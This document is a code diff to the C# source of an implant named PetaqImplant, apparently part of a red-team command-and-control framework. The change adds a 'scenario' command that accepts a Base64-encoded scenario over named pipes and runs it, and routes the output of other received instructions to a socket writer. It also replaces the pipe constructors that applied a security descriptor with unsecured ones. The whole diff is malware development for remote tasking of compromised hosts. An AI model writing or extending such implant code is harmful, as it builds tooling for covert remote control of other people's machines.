@@ -9,6 +9,7 @@ using System.IO;
 using System.IO.Pipes;
 using System.Security.Principal;
 using System.Security.AccessControl;
+using System.Text.RegularExpressions;
 
 namespace PetaqImplant
 {
@@ -47,10 +48,10 @@ namespace PetaqImplant
 
 
                     // Currently implementation has 2 named pipes in use for IO
-                    //NamedPipeServiceRead = new NamedPipeServerStream(NamedPipeServiceName + "i", PipeDirection.InOut, 1);
-                    //NamedPipeServiceWrite = new NamedPipeServerStream(NamedPipeServiceName + "o", PipeDirection.InOut, 1);
-                    NamedPipeServiceRead = new NamedPipeServerStream(NamedPipeServiceName + "i", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 0, 0, ps);
-                    NamedPipeServiceWrite = new NamedPipeServerStream(NamedPipeServiceName + "o", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 0, 0, ps);
+                    NamedPipeServiceRead = new NamedPipeServerStream(NamedPipeServiceName + "i", PipeDirection.InOut, 1);
+                    NamedPipeServiceWrite = new NamedPipeServerStream(NamedPipeServiceName + "o", PipeDirection.InOut, 1);
+                    //NamedPipeServiceRead = new NamedPipeServerStream(NamedPipeServiceName + "i", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 0, 0, ps);
+                    //NamedPipeServiceWrite = new NamedPipeServerStream(NamedPipeServiceName + "o", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 0, 0, ps);
 
                     Console.Error.WriteLine("Waiting for linking...");
                     // Waiting for linking for both service
@@ -79,10 +80,34 @@ namespace PetaqImplant
 
                         //Console.Error.WriteLine("Data received:\n{0}", instruction);
 
-                        //Instruction is processing...
-                        Instructions.Instruct(instruction);
+                        // If scenario is requested call scenario, otherwise run instructions
+                        if (instruction.StartsWith("scenario"))
+                        {
+                            if (Regex.Split(instruction," ").Length < 3)
+                            {
+                                // Set the socket as the Console output
+                                Program.consoleIO = Console.Out;
+                                Console.SetOut(new SocketWriter());
+                                // Raise the error
+                                Console.WriteLine("Usage: scenario file filepath");
+                            }
+                            else
+                            {
+                                // scenario instruction format:
+                                // scenario file BASE64STRING
+                                string scenario_b64 = Regex.Split(instruction," ")[2];
+                                // send the Base64 encoded scenario to run
+                                PetaqImplant.Scenario.Run(scenario_b64);
+                            }
 
-                       
+                        }
+                        else
+                        {
+                            // run the instruction received
+                            PetaqImplant.Instructions.Instruct(instruction, new SocketWriter());
+                        }
+
+
                     }
 
                 }
